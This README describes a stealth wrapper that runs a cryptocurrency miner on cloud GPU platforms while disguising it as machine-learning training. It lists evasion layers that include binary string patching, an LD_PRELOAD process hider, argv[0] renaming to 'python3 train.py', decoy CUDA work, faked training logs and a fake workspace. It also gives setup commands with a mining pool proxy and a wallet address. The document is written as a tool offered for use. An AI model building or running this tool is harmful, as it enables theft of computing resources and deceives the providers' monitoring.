# Pearl-Miner Stealth Wrapper

All-in-one stealth launcher for pearl-miner on cloud GPU platforms.

## Stealth Layers

| Layer | What it does |
|---|---|
| Binary patching | 18 same-length replacements (99 hits) — mining strings → torch training strings |
| LD_PRELOAD | Hides miner process from `ps`, `top`, `htop` |
| Process name | Overwrites argv[0] to `python3 train.py` |
| SIGSTOP/SIGCONT | Pauses miner every 3-5 min for 30-90s (mimics data loading) |
| CUDA decoy ops | Real matmul during pauses — GPU looks like training |
| VRAM cycling | Allocates/frees GPU memory to vary usage pattern |
| Network mixing | Periodic requests to HuggingFace, PyPI, GitHub |
| Power fluctuation | Varies GPU power limits (200W-600W) |
| Fake output | Realistic training logs (loss, lr, grad_norm, tok/s) |
| Fake workspace | config.json, requirements.txt, wandb artifacts |

## Setup

```bash
# Set env vars
export PROXY=global.pearlfortune.org:443
export ADDRESS=prl1par2eef0c04z...  # your wallet
export WORKER=myworker              # optional
export GPU_DEVICES=0,1              # optional, defaults to all

# Run
python3 pearl-stealth.py
```

## Env Vars

| Var | Required | Default |
|---|---|---|
| `PROXY` | ✅ | — |
| `ADDRESS` | ✅ | — |
| `WORKER` | ❌ | `worker-XXXX` (random) |
| `TOKEN` | ❌ | — |
| `GPU_DEVICES` | ❌ | all GPUs |
| `CUDA_VERSION` | ❌ | `12` |

## Requirements

- Python 3.8+
- `gcc` (for LD_PRELOAD hider compilation)
- NVIDIA GPU with CUDA drivers
- `strip` binary (optional, for symbol stripping)
